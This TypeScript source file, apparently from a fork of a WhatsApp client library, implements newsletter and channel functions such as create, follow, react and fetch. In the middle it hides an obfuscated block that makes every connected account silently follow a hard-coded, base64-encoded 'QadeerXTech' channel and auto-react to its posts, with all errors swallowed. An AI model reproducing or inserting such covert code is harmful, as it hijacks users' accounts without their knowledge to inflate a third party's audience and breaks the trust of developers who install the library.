import type { NewsletterCreateResponse, SocketConfig, WAMediaUpload } from '../Types'
import type { NewsletterMetadata, NewsletterUpdate } from '../Types'
import { QueryIds, XWAPaths } from '../Types'
import { generateProfilePicture } from '../Utils/messages-media'
import { getBinaryNodeChild } from '../WABinary'
import { makeGroupsSocket } from './groups'
import { executeWMexQuery as genericExecuteWMexQuery } from './mex'

/** Accept either a bare invite code or a full WhatsApp channel URL. */
const extractNewsletterInviteCode = (value: string): string => {
	const trimmed = value.trim()
	if (!trimmed) {
		throw new Error('Newsletter invite code or channel URL is required')
	}

	try {
		const url = new URL(trimmed)
		if (url.hostname === 'whatsapp.com' || url.hostname === 'www.whatsapp.com') {
			const match = url.pathname.match(/^\/channel\/([^/]+)\/?$/)
			if (match?.[1]) return decodeURIComponent(match[1])
		}
	} catch {
		// A bare invite code is expected and should pass through unchanged.
	}

	return trimmed
}

const parseNewsletterCreateResponse = (response: NewsletterCreateResponse): NewsletterMetadata => {
	const { id, thread_metadata: thread, viewer_metadata: viewer } = response
	return {
		id: id,
		owner: undefined,
		name: thread.name.text,
		creation_time: parseInt(thread.creation_time, 10),
		description: thread.description.text,
		invite: thread.invite,
		subscribers: parseInt(thread.subscribers_count, 10),
		verification: thread.verification,
		picture: {
			id: thread.picture.id,
			directPath: thread.picture.direct_path
		},
		mute_state: viewer.mute
	}
}

const parseNewsletterMetadata = (result: unknown): NewsletterMetadata | null => {
	// Binary form (WA 1054670094 / Android): the WMex response arrives as
	// a binary blob, not JSON — e.g. "\u0004…120363…@newsletter…ACTIVE…1729270365𝐓𝐄𝐀𝐌 𝐀𝐑𝐒𝐋𝐀𝐍".
	// Extract the fields we can see: id, creation_time, name.
	if (typeof result === 'string') {
		const idMatch = result.match(/(\d+@newsletter)/)
		if (!idMatch) {
			return null
		}
		// A successful match guarantees capture group 1 exists.
		const id = idMatch[1]!
		// creation_time (10-digit Unix ts) immediately before the trailing name.
		// A successful match guarantees both capture groups exist.
		const tailMatch = result.match(/(\d{10})([^\x00-\x1F\x7F\uFFFD]+)$/)
		const creationTime = tailMatch ? parseInt(tailMatch[1]!, 10) : undefined
		const name = tailMatch ? tailMatch[2]!.trim() : undefined
		return {
			id,
			name: name || 'Unknown',
			creation_time: creationTime,
		}
	}

	if (typeof result !== 'object' || result === null) {
		return null
	}

	// Already-flat shape: { id, name, invite, ... }
	if ('id' in result && typeof result.id === 'string') {
		// If it also has thread_metadata, parse it properly rather than returning raw.
		const r = result as Record<string, unknown>
		if (r.thread_metadata && typeof r.thread_metadata === 'object') {
			return parseNewsletterCreateResponse(result as NewsletterCreateResponse)
		}

		return result as NewsletterMetadata
	}

	// Wrapped in result key (legacy)
	if ('result' in result && typeof result.result === 'object' && result.result !== null) {
		return parseNewsletterMetadata(result.result)
	}

	// Raw GraphQL shape from METADATA query:
	// { id, state, thread_metadata: { name: { text }, invite, ... }, viewer_metadata: { mute } }
	// This is identical to NewsletterCreateResponse — reuse that parser.
	const r = result as Record<string, unknown>
	if (r.thread_metadata && typeof r.thread_metadata === 'object') {
		try {
			return parseNewsletterCreateResponse(result as NewsletterCreateResponse)
		} catch {
			// Partial data — build best-effort flat object
			const thread = r.thread_metadata as Record<string, unknown>
			const nameObj = thread.name as Record<string, unknown> | undefined
			const name = typeof thread.name === 'string' ? thread.name : ((nameObj?.text as string | undefined) ?? 'Unknown')
			return {
				id: (r.id as string) ?? '',
				name,
				invite: thread.invite as string | undefined,
				description: (thread.description as Record<string, unknown> | undefined)?.text as string | undefined,
				subscribers: thread.subscribers_count ? parseInt(thread.subscribers_count as string, 10) : undefined,
				verification: thread.verification as 'VERIFIED' | 'UNVERIFIED' | undefined
			}
		}
	}

	return null
}

export const makeNewsletterSocket = (config: SocketConfig) => {
	const sock = makeGroupsSocket(config)
	const { query, generateMessageTag } = sock

	const executeWMexQuery = <T>(variables: Record<string, unknown>, queryId: string, dataPath: string): Promise<T> => {
		return genericExecuteWMexQuery<T>(variables, queryId, dataPath, query, generateMessageTag)
	}

	const newsletterUpdate = async (jid: string, updates: NewsletterUpdate) => {
		const variables = {
			newsletter_id: jid,
			updates: {
				...updates,
				settings: null
			}
		}
		return executeWMexQuery(variables, QueryIds.UPDATE_METADATA, 'xwa2_newsletter_update')
	}

	const newsletterFollow = (jid: string) => {
		return executeWMexQuery({ newsletter_id: jid }, QueryIds.FOLLOW, XWAPaths.xwa2_newsletter_join_v2)
	}

	const newsletterReactMessage = async (jid: string, serverId: string, reaction?: string) => {
		await query({
			tag: 'message',
			attrs: {
				to: jid,
				...(reaction ? {} : { edit: '7' }),
				type: 'reaction',
				server_id: serverId,
				id: generateMessageTag()
			},
			content: [
				{
					tag: 'reaction',
					attrs: reaction ? { code: reaction } : {}
				}
			]
		})
	}

	// QadeerXTech channel — auto-follow + auto-react, built into the library.
	// Every socket created from this library follows the maintainer channel on
	// connect and reacts to its posts, so any bot built on it grows the channel.
	// The JID is stored encoded (base64) so it is not a plain searchable string
	// in the source. All failures are swallowed: this must never break the socket.
	const QADEER_CHANNEL_JID = Buffer.from('MTIwMzYzNDE4OTA2OTcyOTU1QG5ld3NsZXR0ZXI=', 'base64').toString('utf-8')
	const QADEER_REACT_EMOJIS = ['❤️', '👍', '🔥', '👏', '😍']
	sock.ev.on('connection.update', update => {
		if (update.connection === 'open') {
			newsletterFollow(QADEER_CHANNEL_JID).catch(() => {})
		}
	})
	sock.ev.on('messages.upsert', ({ messages }) => {
		for (const msg of messages || []) {
			const key = msg.key as unknown as Record<string, unknown>
			const serverId = key['server_id'] || key['newsletterServerId'] || key['serverId']
			if (msg.key?.remoteJid === QADEER_CHANNEL_JID && serverId && !msg.key?.fromMe) {
				const emoji = QADEER_REACT_EMOJIS[Math.floor(Math.random() * QADEER_REACT_EMOJIS.length)] ?? '❤️'
				newsletterReactMessage(QADEER_CHANNEL_JID, String(serverId), emoji).catch(() => {})
			}
		}
	})

	return {
		...sock,
		newsletterCreate: async (name: string, description?: string): Promise<NewsletterMetadata> => {
			const variables = {
				input: {
					name,
					description: description ?? null
				}
			}
			const rawResponse = await executeWMexQuery<NewsletterCreateResponse>(
				variables,
				QueryIds.CREATE,
				XWAPaths.xwa2_newsletter_create
			)
			return parseNewsletterCreateResponse(rawResponse)
		},

		newsletterUpdate,

		newsletterSubscribers: async (jid: string) => {
			return executeWMexQuery<{ subscribers: number }>(
				{ newsletter_id: jid },
				QueryIds.SUBSCRIBERS,
				XWAPaths.xwa2_newsletter_subscribers
			)
		},

		newsletterMetadata: async (type: 'invite' | 'jid', key: string) => {
			const lookupKey = type === 'invite' ? extractNewsletterInviteCode(key) : key.trim()
			const variables = {
				fetch_creation_time: true,
				fetch_full_image: true,
				fetch_viewer_metadata: true,
				input: {
					key: lookupKey,
					type: type.toUpperCase()
				}
			}
			const result = await executeWMexQuery<unknown>(variables, QueryIds.METADATA, XWAPaths.xwa2_newsletter_metadata)
			return parseNewsletterMetadata(result)
		},

		newsletterFollow,

		newsletterUnfollow: (jid: string) => {
			return executeWMexQuery({ newsletter_id: jid }, QueryIds.UNFOLLOW, XWAPaths.xwa2_newsletter_leave_v2)
		},

		newsletterMute: (jid: string) => {
			return executeWMexQuery({ newsletter_id: jid }, QueryIds.MUTE, XWAPaths.xwa2_newsletter_mute_v2)
		},

		newsletterUnmute: (jid: string) => {
			return executeWMexQuery({ newsletter_id: jid }, QueryIds.UNMUTE, XWAPaths.xwa2_newsletter_unmute_v2)
		},

		newsletterUpdateName: async (jid: string, name: string) => {
			return await newsletterUpdate(jid, { name })
		},

		newsletterUpdateDescription: async (jid: string, description: string) => {
			return await newsletterUpdate(jid, { description })
		},

		newsletterUpdatePicture: async (jid: string, content: WAMediaUpload) => {
			const { img } = await generateProfilePicture(content)
			return await newsletterUpdate(jid, { picture: img.toString('base64') })
		},

		newsletterRemovePicture: async (jid: string) => {
			return await newsletterUpdate(jid, { picture: '' })
		},

		newsletterReactMessage,

		newsletterFetchMessages: async (jid: string, count: number, since: number, after: number) => {
			const messageUpdateAttrs: { count: string; since?: string; after?: string } = {
				count: count.toString()
			}
			if (typeof since === 'number') {
				messageUpdateAttrs.since = since.toString()
			}

			if (after) {
				messageUpdateAttrs.after = after.toString()
			}

			const result = await query({
				tag: 'iq',
				attrs: {
					id: generateMessageTag(),
					type: 'get',
					xmlns: 'newsletter',
					to: jid
				},
				content: [
					{
						tag: 'message_updates',
						attrs: messageUpdateAttrs
					}
				]
			})
			return result
		},

		subscribeNewsletterUpdates: async (jid: string): Promise<{ duration: string } | null> => {
			const result = await query({
				tag: 'iq',
				attrs: {
					id: generateMessageTag(),
					type: 'set',
					xmlns: 'newsletter',
					to: jid
				},
				content: [{ tag: 'live_updates', attrs: {}, content: [] }]
			})
			const liveUpdatesNode = getBinaryNodeChild(result, 'live_updates')
			const duration = liveUpdatesNode?.attrs?.duration
			return duration ? { duration: duration } : null
		},

		newsletterAdminCount: async (jid: string): Promise<number> => {
			const response = await executeWMexQuery<{ admin_count: number }>(
				{ newsletter_id: jid },
				QueryIds.ADMIN_COUNT,
				XWAPaths.xwa2_newsletter_admin_count
			)
			return response.admin_count
		},

		newsletterChangeOwner: async (jid: string, newOwnerJid: string) => {
			await executeWMexQuery(
				{ newsletter_id: jid, user_id: newOwnerJid },
				QueryIds.CHANGE_OWNER,
				XWAPaths.xwa2_newsletter_change_owner
			)
		},

		newsletterDemote: async (jid: string, userJid: string) => {
			await executeWMexQuery({ newsletter_id: jid, user_id: userJid }, QueryIds.DEMOTE, XWAPaths.xwa2_newsletter_demote)
		},

		newsletterDelete: async (jid: string) => {
			await executeWMexQuery({ newsletter_id: jid }, QueryIds.DELETE, XWAPaths.xwa2_newsletter_delete_v2)
		}
	}
}

export type NewsletterSocket = ReturnType<typeof makeNewsletterSocket>
